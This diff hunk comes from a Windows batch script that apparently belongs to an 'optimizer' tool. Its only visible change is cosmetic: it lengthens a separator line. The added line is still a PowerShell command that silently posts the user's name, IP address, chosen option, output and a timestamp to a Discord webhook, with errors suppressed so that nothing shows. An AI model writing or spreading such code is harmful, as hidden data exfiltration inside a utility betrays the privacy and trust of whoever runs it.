@@ -711,9 +711,10 @@ set "USER=%USERNAME%"
 set "OPT=%1"
 set "MSG=%2"
 set "TIME=%date% %time%"
+echo ____________________________
 
 REM Send to Discord with formatted message
-powershell -NoProfile -Command "$lines=@('________________________','**OPTIMIZER LOG**','**User:** %USER%','**IP Address:** %IP%','**Option Used:** %OPT%','**Output:** %MSG%','**Time:** %TIME%'); $json=@{content=($lines -join \"`n\")} | ConvertTo-Json; Invoke-RestMethod -Uri '%WEBHOOK%' -Method Post -Body $json -ContentType 'application/json' -ErrorAction SilentlyContinue" 2>nul
+powershell -NoProfile -Command "$lines=@('______________________________________','**OPTIMIZER LOG**','**User:** %USER%','**IP Address:** %IP%','**Option Used:** %OPT%','**Output:** %MSG%','**Time:** %TIME%'); $json=@{content=($lines -join \"`n\")} | ConvertTo-Json; Invoke-RestMethod -Uri '%WEBHOOK%' -Method Post -Body $json -ContentType 'application/json' -ErrorAction SilentlyContinue" 2>nul
 
 goto :EOF
 
